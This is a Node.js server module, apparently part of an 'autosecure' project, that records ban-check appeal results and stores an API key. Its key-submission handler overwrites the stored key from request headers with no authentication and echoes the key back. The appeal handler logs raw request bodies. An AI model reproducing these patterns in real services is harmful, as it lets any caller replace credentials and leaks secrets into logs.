const { finishedappealmsg } = require('../../autosecure/utils/bancheckappeal/appealmsg');
const generateuid = require('../../autosecure/utils/utils/generateuid');
const { queryParams } = require("../../db/database");
const { autosecurelogs } = require('../../autosecure/utils/embeds/autosecurelogs');

async function handleAppealPost(res, body) {
    if (!body) {
        res.statusCode = 400;
        res.setHeader('Content-Type', 'application/json');
        res.end(JSON.stringify({ error: "Empty request body" }));
        return;
    }

    let data;
    try {
        data = JSON.parse(body);
    } catch (err) {
        res.statusCode = 400;
        res.setHeader('Content-Type', 'application/json');
        res.end(JSON.stringify({ error: "Invalid JSON" }));
        return;
    }

    if (!data.appeal) {
        res.statusCode = 400;
        res.setHeader('Content-Type', 'application/json');
        res.end(JSON.stringify({ error: "Missing 'appeal' object in payload" }));
        return;
    }

    try {
        console.log('Received POST data:', data);

        const uid = await savefinishedappeal(data);
        await finishedappealmsg(data.appeal, uid);

        res.statusCode = 200;
        res.setHeader('Content-Type', 'application/json');
        res.end(JSON.stringify({ status: "success", message: `${uid}` }));
    } catch (err) {
        console.error('Error handling appeal result:', err);
        res.statusCode = 500;
        res.setHeader('Content-Type', 'application/json');
        res.end(JSON.stringify({ error: err.message || "Internal server error" }));
    }
}

async function handleSubmitKey(res, headers) {
    if (headers["apikey"] && headers["expiration"]) {
        const apiKey = headers["apikey"];
        const expirationTime = headers["expiration"];

        await queryParams(
            `INSERT OR REPLACE INTO apikey (id, apikey, time) VALUES (?, ?, ?)`,
            [1, apiKey, expirationTime]
        );

        res.statusCode = 200;
        res.end(JSON.stringify({ success: true, done: `Added ${apiKey} with expiration ${expirationTime}` }));

        await autosecurelogs(null, "newkey", `${apiKey}`, `${expirationTime}`);
    } else {
        res.statusCode = 400;
        res.end(JSON.stringify({ success: false, missing: "One of these headers: Apikey & Expiration" }));
    }
}

/*
Finished old appeals inserted db but no message has been sent, so below fixes that.
*/

async function oldfinishedappeals() {
    const { queryParams } = require("../../db/database");
    const { finishedappealmsg } = require('../../autosecure/utils/bancheckappeal/appealmsg');

    try {
        const oldAppeals = await queryParams(`SELECT id, data FROM finishedappeal`, [], "all");

        if (!oldAppeals || oldAppeals.length === 0) {
            console.log('No old appeals found in database');
            return;
        }

        console.log(`Processing ${oldAppeals.length} old appeals...`);

        for (const appeal of oldAppeals) {
            try {
                const appealData = JSON.parse(appeal.data);
                await finishedappealmsg(appealData.appeal);
                console.log(`Processed old appeal with ID: ${appeal.id}`);
            } catch (err) {
                console.error(`Error processing old appeal ${appeal.id}:`, err);
            }
        }

        console.log('Finished processing old appeals');
    } catch (err) {
        console.error('Error in oldfinishedappeals:', err);
    }
}

async function savefinishedappeal(data) {
    const uid = await generateuid();
    const stringified = JSON.stringify(data);
    await queryParams(`INSERT INTO finishedappeal (id, data) VALUES (?, ?)`, [uid, stringified]);
    return uid;
}

module.exports = {
    handleAppealPost,
    handleSubmitKey,
    oldfinishedappeals
};
